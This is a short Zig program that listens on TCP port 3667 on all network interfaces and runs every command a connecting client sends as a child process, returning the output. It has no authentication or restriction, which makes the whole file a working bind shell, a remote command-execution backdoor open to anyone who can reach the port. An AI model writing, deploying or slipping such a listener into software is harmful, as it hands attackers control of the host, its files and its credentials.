const std = @import("std");
const print = std.debug.print;
const Child = std.process.Child;
const ArrayList = std.ArrayList;
const ArrayListUnmanaged = std.ArrayListUnmanaged;
const mem = std.mem;

pub fn executeCommand(allocator: std.mem.Allocator, command: []const u8) ![]const u8 {
    // Split the command string into arguments
    var argv = ArrayList([]const u8).init(allocator);
    defer argv.deinit();

    var iterator = mem.splitScalar(u8, command, ' ');
    while (iterator.next()) |arg| {
        try argv.append(arg);
    }

    // Initialize and spawn the child process
    var child = Child.init(argv.items, allocator);
    child.stdout_behavior = .Pipe;
    child.stderr_behavior = .Pipe;

    // Use unmanaged array lists for stdout/stderr to match collectOutput API
    var stdout: ArrayListUnmanaged(u8) = .empty;
    defer stdout.deinit(allocator);
    var stderr: ArrayListUnmanaged(u8) = .empty;
    defer stderr.deinit(allocator);

    try child.spawn();
    try child.collectOutput(allocator, &stdout, &stderr, 1024);
    _ = try child.wait();

    // If there was any stderr, append it to the stdout output
    if (stderr.items.len > 0) {
        try stdout.appendSlice(allocator, "\nErrors:\n");
        try stdout.appendSlice(allocator, stderr.items);
    }

    // Return the collected stdout as a newly allocated slice
    return try stdout.toOwnedSlice(allocator);
}

pub fn main() !void {
    var gpa_alloc = std.heap.GeneralPurposeAllocator(.{}){};
    defer std.debug.assert(gpa_alloc.deinit() == .ok);
    const gpa = gpa_alloc.allocator();

    const addr = std.net.Address.initIp4(.{ 0, 0, 0, 0 }, 3667);
    var server = try addr.listen(.{});
    std.log.info("Server listening on port 3667", .{});

    while (true) {
        var client = try server.accept();
        defer client.stream.close();

        const client_reader = client.stream.reader();
        const client_writer = client.stream.writer();

        while (true) {
            const command = try client_reader.readUntilDelimiterOrEofAlloc(gpa, '\n', 65536) orelse break;
            defer gpa.free(command);

            std.log.info("Received command: \"{s}\"", .{command});

            const output = try executeCommand(gpa, command);
            defer gpa.free(output);

            try client_writer.writeAll(output);
            try client_writer.writeByte('\n');
        }
    }
}
